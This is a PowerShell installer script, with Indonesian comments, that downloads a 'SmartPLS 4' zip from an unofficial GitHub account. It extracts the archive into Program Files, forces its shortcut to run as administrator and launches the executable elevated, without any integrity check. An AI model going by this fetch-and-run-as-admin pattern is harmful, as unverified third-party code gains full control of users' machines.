#requires -Version 5.1
$ErrorActionPreference = "Stop"

# ==========================================
# KONFIGURASI
# ==========================================
$DownloadURL = "https://github.com/mytoolsss/install/releases/latest/download/pls.zip"
$InstallDir = "$env:ProgramFiles\SmartPLS 4"
$WorkDir    = "$env:TEMP\SmartPLSInstaller"
$ZipFile    = Join-Path $WorkDir "pls.zip"

# ==========================================
# PERIKSA HAK ADMINISTRATOR
# ==========================================
$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($Identity)

if (-not $Principal.IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)) {
    Write-Host "Jalankan PowerShell sebagai Administrator." -ForegroundColor Yellow
    exit 1
}

try {

    # ==========================================
    # 1. PERSIAPAN DOWNLOAD
    # ==========================================
    Write-Host "`n[1/5] Mengunduh SmartPLS..." -ForegroundColor Cyan

    New-Item -ItemType Directory -Path $WorkDir -Force |
        Out-Null

    # Hapus file lama agar tidak menggunakan ZIP yang tidak lengkap
    if (Test-Path $ZipFile) {
        Remove-Item $ZipFile -Force
    }

    # Cari curl.exe
    $Curl = Get-Command curl.exe -ErrorAction SilentlyContinue

    if (-not $Curl) {
        throw "curl.exe tidak ditemukan di Windows."
    }

    # ==========================================
    # 2. DOWNLOAD DENGAN PROGRESS BAR
    # ==========================================
    Write-Host "`nMengunduh file ZIP..." -ForegroundColor Yellow
    Write-Host "Progress download akan ditampilkan di bawah." -ForegroundColor Gray

    # Gunakan curl native progress bar
    $CurlArgs = @(
        "-L"
        "--fail"
        "--show-error"
        "--progress-bar"
        "--retry", "5"
        "--retry-delay", "2"
        "--connect-timeout", "30"
        "--output", $ZipFile
        $DownloadURL
    )

    # Jalankan curl langsung agar progress bar terlihat
    & $Curl.Source @CurlArgs

    if ($LASTEXITCODE -ne 0) {
        throw "Download gagal. Exit code: $LASTEXITCODE"
    }

    if (!(Test-Path $ZipFile) -or
        (Get-Item $ZipFile).Length -eq 0) {
        throw "File ZIP gagal diunduh atau kosong."
    }

    Write-Host "`nDownload berhasil!" -ForegroundColor Green

    # ==========================================
    # 3. PERIKSA FILE ZIP
    # ==========================================
    Write-Host "`n[2/5] Memeriksa file ZIP..." -ForegroundColor Cyan

    Add-Type -AssemblyName System.IO.Compression.FileSystem

    $Archive = [System.IO.Compression.ZipFile]::OpenRead($ZipFile)

    try {
        $EntryCount = $Archive.Entries.Count

        if ($EntryCount -eq 0) {
            throw "File ZIP kosong."
        }

        Write-Host "File ZIP valid. Total file: $EntryCount" -ForegroundColor Green
    }
    finally {
        $Archive.Dispose()
    }

    # ==========================================
    # 4. EKSTRAK PROGRAM
    # ==========================================
    Write-Host "`n[3/5] Mengekstrak SmartPLS..." -ForegroundColor Cyan

    New-Item -ItemType Directory -Path $InstallDir -Force |
        Out-Null

    Expand-Archive `
        -Path $ZipFile `
        -DestinationPath $InstallDir `
        -Force

    # Cari smartpls.exe
    $Exe = Get-ChildItem `
        -Path $InstallDir `
        -Filter "smartpls.exe" `
        -File `
        -Recurse |
        Select-Object -First 1

    if (!$Exe) {
        throw "smartpls.exe tidak ditemukan. Periksa isi pls.zip."
    }

    Write-Host "Executable ditemukan: $($Exe.FullName)" -ForegroundColor Green

    # ==========================================
    # 5. BUAT SHORTCUT DESKTOP
    # ==========================================
    Write-Host "`n[4/5] Membuat shortcut Desktop..." -ForegroundColor Cyan

    $Desktop = [Environment]::GetFolderPath("CommonDesktopDirectory")

    $Shell = New-Object -ComObject WScript.Shell

    $ShortcutPath = "$Desktop\SmartPLS 4.lnk"

    $Shortcut = $Shell.CreateShortcut($ShortcutPath)

    $Shortcut.TargetPath = $Exe.FullName
    $Shortcut.WorkingDirectory = $Exe.DirectoryName
    $Shortcut.Arguments = ""

    $Shortcut.Save()

    # Aktifkan RunAs pada shortcut
    $Bytes = [System.IO.File]::ReadAllBytes($ShortcutPath)

    $Bytes[21] = $Bytes[21] -bor 0x20

    [System.IO.File]::WriteAllBytes(
        $ShortcutPath,
        $Bytes
    )

    Write-Host "Shortcut berhasil dibuat." -ForegroundColor Green

    # ==========================================
    # 6. JALANKAN SMARTPLS
    # ==========================================
    Write-Host "`n[5/5] Menjalankan SmartPLS..." -ForegroundColor Cyan

    Start-Process `
        -FilePath $Exe.FullName `
        -WorkingDirectory $Exe.DirectoryName `
        -Verb RunAs

    # ==========================================
    # SELESAI
    # ==========================================
    Write-Host "`n====================================" -ForegroundColor Green
    Write-Host "INSTALASI SELESAI" -ForegroundColor Green
    Write-Host "====================================" -ForegroundColor Green

    Write-Host "Lokasi      : $InstallDir"
    Write-Host "Executable  : $($Exe.FullName)"
    Write-Host "Shortcut    : Desktop\SmartPLS 4.lnk"
    Write-Host "Status      : SmartPLS dijalankan sebagai Administrator."

}
catch {

    Write-Host "`nINSTALASI GAGAL" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red

    exit 1
}
